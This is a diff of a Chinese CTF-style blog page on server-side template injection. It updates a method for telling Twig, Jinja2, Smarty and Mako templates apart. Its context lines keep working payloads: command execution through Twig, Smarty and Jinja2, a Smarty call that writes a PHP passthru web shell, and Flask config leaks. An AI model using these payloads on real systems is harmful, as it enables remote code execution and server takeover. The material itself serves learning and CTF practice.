@@ -23,11 +23,13 @@
 <meta property="og:site_name" content="Englobe blog">
 <meta property="og:description" content="PHPvar_dump( ) 以列的形式展开数据，方便查看 scandir( ) 扫描某一文件夹目录 file_get_contents( ) 读取文件，拼接用’.’ 如num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) base_convert() 函数 在任意进制之间转换数字，返回一个字符">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/16/eFVDI.png">
 <meta property="article:published_time" content="2023-09-27T13:16:34.000Z">
-<meta property="article:modified_time" content="2023-11-09T14:23:31.658Z">
+<meta property="article:modified_time" content="2024-03-17T12:15:28.408Z">
 <meta property="article:author" content="Englobe">
 <meta property="article:tag" content="常用知识点">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i0.imgs.ovh/2024/03/16/eFVDI.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -222,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9k 字
+          9.2k 字
         
       </span>
     
@@ -233,7 +235,7 @@
         
         
         
-          76 分钟
+          77 分钟
         
       </span>
     
@@ -362,25 +364,20 @@
 
 
 
-<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>X-Forward-For:{7 * 7} 回显49为Smarty模板注入</p>
-<p>X-Forward-For:{system(‘pwd’)} 在{}中执行命令</p>
-<p>user&#x3D;NaN 回显49 &#x3D;&#x3D;&gt;Twig 若回显7777777 &#x3D;&#x3D;&gt; Jinja2</p>
+<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>判断模板</p>
+<p><img src="https://i0.imgs.ovh/2024/03/16/eFVDI.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>绿色是执行成功，红色是执行失败</p>
+<p>注入${7＊7}没有回显出49的情况，这种时候就是执行失败走红线，再次注入如果还是没有回显49就代表这里没有模板注入；如果注入回显了49代表执行成功，继续往下走注入，如果执行成功回显7777777说明是jinja2模板，如果回显是49就说明是Twig模板。<br>注入${7＊7}成功回显出49的情况，这种时候是执行成功走绿线，再次注入a{＊comment＊}b，如果执行成功回显ab，就说明是Smarty模板；如果没有回显出ab，就是执行失败走红线，注入${“z”.join(“ab”)}，如果执行成功回显出zab就说明是Mako模板。</p>
 <p>常用利用方式</p>
 <p>Twig</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-
-<p>Smarty</p>
 <p>Smarty</p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="language-xml">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="language-xml">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="language-xml">// another</span><br><span class="language-xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;,self::clearConfig())&#125;</span><br></code></pre></td></tr></table></figure>
 
-
-<p>Jinja2</p>
 <p>Jinja2</p>
 <figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
 
-
-<p>Flask</p>
 <p>Flask</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) 是可以读取配置的</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="language-xml">应该是可以查看app.config的内容</span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;.config]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">Z2V0X2ZsYXNoZWRfbWVzc2FnZXM</span>=.X19nbG9iYWxzX18=[‘current_app’.config]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
